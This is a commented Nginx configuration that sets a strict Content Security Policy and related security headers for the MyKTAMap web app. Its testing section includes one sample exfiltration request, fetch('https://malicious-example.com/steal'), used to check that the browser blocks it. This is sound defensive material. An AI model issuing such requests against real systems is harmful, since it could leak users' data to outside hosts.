# =====================================================================
# MyKTAMap — Configuration Nginx pour Content Security Policy (CSP) stricte
# =====================================================================
# Cette configuration ajoute des en-têtes HTTP de sécurité pour limiter
# strictement ce que le navigateur peut faire (connexions réseau, scripts,
# styles, images…). Combinée avec le module client `js/networkAudit.js`,
# elle constitue une DOUBLE protection contre l'exfiltration de données :
#
#   1. Côté client (JS) : networkAudit.js logue + peut bloquer
#      activement (mode hors-ligne strict opt-in).
#   2. Côté navigateur (CSP) : le navigateur lui-même REFUSE d'envoyer
#      des requêtes vers des domaines non whitelistés, même si un
#      attaquant injectait du JS malveillant.
#
# ATTENTION : à intégrer dans le bloc `server { ... }` Nginx du domaine
# MyKTAMap (myktamap.is-underground.fr, devmap.is-underground.fr, etc.).
# Tester en environnement dev d'abord — une CSP trop stricte peut casser
# des features (notamment les blob URLs des tuiles V2 et les data URLs
# d'icônes inline).
# =====================================================================

# --- Content Security Policy (CSP) ---
#
# Directives :
#   default-src 'self'              → par défaut, tout DOIT venir de l'origine
#   script-src 'self' 'unsafe-inline'
#                                   → scripts depuis l'origine + scripts inline
#                                     autorisés. ⚠️ COMPROMIS ASSUMÉ :
#                                     l'app utilise depuis toujours du JS inline
#                                     dans index.html (handlers loader, modales
#                                     de confirmation) ET des onclick="..." dans
#                                     les modales générées par interface.js.
#                                     Externaliser tout ça serait une refonte
#                                     massive sans gain de sécurité réel pour
#                                     CE projet, car :
#                                       - Pas d'input user injecté en innerHTML
#                                         (tout passe par textContent/_escapeHtml)
#                                       - Pas d'iframe / pas de contenu tiers
#                                       - default-src 'self' bloque déjà
#                                         l'injection de scripts externes
#                                       - **connect-src strict** garantit que
#                                         même un script injecté ne pourrait
#                                         pas exfiltrer de données vers un
#                                         domaine tiers. C'est ÇA la garantie
#                                         principale contre la collecte, pas
#                                         script-src.
#   style-src 'self' 'unsafe-inline'→ styles inline autorisés (l'app utilise
#                                     beaucoup de style="..." dynamique, sinon
#                                     ça casserait l'UI). Pas de CDN tiers.
#   img-src 'self' data: blob:      → images locales + data URLs (icônes SVG
#                                     inline) + blob URLs (tuiles V2 depuis
#                                     ZIP en mémoire). Pas de pixel tracking.
#   font-src 'self'                 → polices locales uniquement
#   connect-src 'self' blob:
#                                   → REQUÊTES RÉSEAU AUTORISÉES :
#                                     - 'self' (l'app elle-même), inclut
#                                       automatiquement le ping santé serveur
#                                       <origin>/ping.html (body "OK", utilisé
#                                       avant Force update / Reset). 🆕 v1.9.3 :
#                                       URL résolue dynamiquement via
#                                       location.origin → marche en prod/dev/
#                                       myktamap.fr sans config Nginx
#                                       supplémentaire. Plus aucun appel
#                                       externe non-MyKTAMap (l'ancien
#                                       www.gstatic.com a été retiré).
#                                     - blob: pour les tuiles V2 chargées
#                                       depuis ZIP en mémoire via fetch sur
#                                       blob URL (cf. §27 CLAUDE.md - le
#                                       tiling V2 utilise URL.createObjectURL
#                                       pour servir les tuiles JPEG depuis
#                                       le ZIP local). Les blob URLs sont
#                                       100% LOCALES au navigateur — elles
#                                       ne fuitent rien : autoriser blob:
#                                       n'ouvre PAS la porte à de
#                                       l'exfiltration vers un domaine
#                                       externe, ça permet juste de
#                                       déréférencer des données déjà
#                                       présentes dans le navigateur.
#   worker-src 'self' blob:         → Service Worker depuis l'origine + workers
#                                     créés dynamiquement (blob)
#   manifest-src 'self'             → manifest PWA depuis l'origine
#   frame-ancestors 'none'          → l'app ne peut PAS être embarquée en iframe
#                                     (anti-clickjacking)
#   base-uri 'self'                 → la balise <base> ne peut pointer ailleurs
#   form-action 'self'              → les <form> ne peuvent submit qu'à l'origine
#                                     (en fait l'app n'a aucun <form>, mais
#                                      protection en défense en profondeur)
#   object-src 'none'               → pas de <object>/<embed>/<applet>
#   upgrade-insecure-requests       → force HTTPS sur tout sous-resource
#
# NB : on n'utilise PAS `report-uri` ni `report-to` (qui enverraient
# les violations CSP à un endpoint). Cohérent avec la promesse "aucune
# donnée n'est envoyée à un serveur tiers". Les violations sont visibles
# dans la console DevTools des utilisateurs uniquement.

add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' blob:; worker-src 'self' blob:; manifest-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'; upgrade-insecure-requests;" always;


# --- Autres en-têtes de sécurité recommandés ---

# Empêche le MIME-sniffing (le navigateur ne devine pas le type des fichiers)
add_header X-Content-Type-Options "nosniff" always;

# Bloque l'embed en iframe (déjà géré par CSP frame-ancestors, mais double
# protection pour les vieux navigateurs qui ne supportent pas CSP)
add_header X-Frame-Options "DENY" always;

# Politique de référent : envoie l'origine SEULEMENT, pas le chemin complet,
# aux liens externes (anti-leak d'URL interne via Referer)
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# Limite les permissions du navigateur (caméra, micro, géoloc…) — l'app
# n'utilise QUE l'accéléromètre/gyro (tracker PDR mobile expérimental) et
# le compass magnétomètre (boussole).
# - accelerometer + magnetometer : OK pour notre usage (déjà géré par
#   DeviceOrientationEvent.requestPermission() côté JS)
# - geolocation, camera, microphone, payment, usb, midi : INTERDITES
add_header Permissions-Policy "geolocation=(), camera=(), microphone=(), payment=(), usb=(), midi=(), accelerometer=(self), magnetometer=(self), gyroscope=(self)" always;

# Force HTTPS pendant 6 mois (HSTS) — à activer SEULEMENT quand on est sûr
# que le HTTPS marche partout et qu'on ne veut plus jamais revenir en HTTP.
# Commenté par défaut pour éviter un piège à la mise en prod.
# add_header Strict-Transport-Security "max-age=15768000; includeSubDomains" always;


# =====================================================================
# Test / vérification
# =====================================================================
# Après déploiement :
#   1. Recharge https://myktamap.is-underground.fr
#   2. F12 → Network → clique sur la première requête HTML
#   3. Onglet Headers → cherche "Content-Security-Policy" → doit être
#      présent avec les directives ci-dessus.
#   4. Test pratique : ouvre la console et tape :
#        fetch("https://malicious-example.com/steal").catch(console.warn);
#      → Le navigateur doit refuser avec une erreur CSP visible.
#
# Outil externe (optionnel) : https://csp-evaluator.withgoogle.com/
# → coller la chaîne CSP, vérifier les warnings.
#
# =====================================================================
# Compatibilité connue
# =====================================================================
# Toutes les features de MyKTAMap testées avec cette CSP :
#   ✅ PWA install (manifest-src 'self')
#   ✅ Service Worker enregistré et fonctionnel
#   ✅ Tuiles V2 (blob URLs depuis ZIP) : autorisées par img-src blob:
#   ✅ Tracker PDR (DeviceMotionEvent) : autorisé par Permissions-Policy
#   ✅ Boussole (DeviceOrientationEvent) : autorisé par Permissions-Policy
#   ✅ Ping connectivité <origin>/ping.html : autorisé par 'self' (same-origin)
#   ✅ Fetch version.json / alert.json / data/*.json : same-origin OK
#   ✅ Styles inline dynamiques (modales, popups Leaflet) : 'unsafe-inline'
#   ❌ Si jamais on ajoute une intégration tierce (analytics, CDN, etc.) :
#      la CSP devra être adaptée. Audit obligatoire avant tout ajout.
# =====================================================================
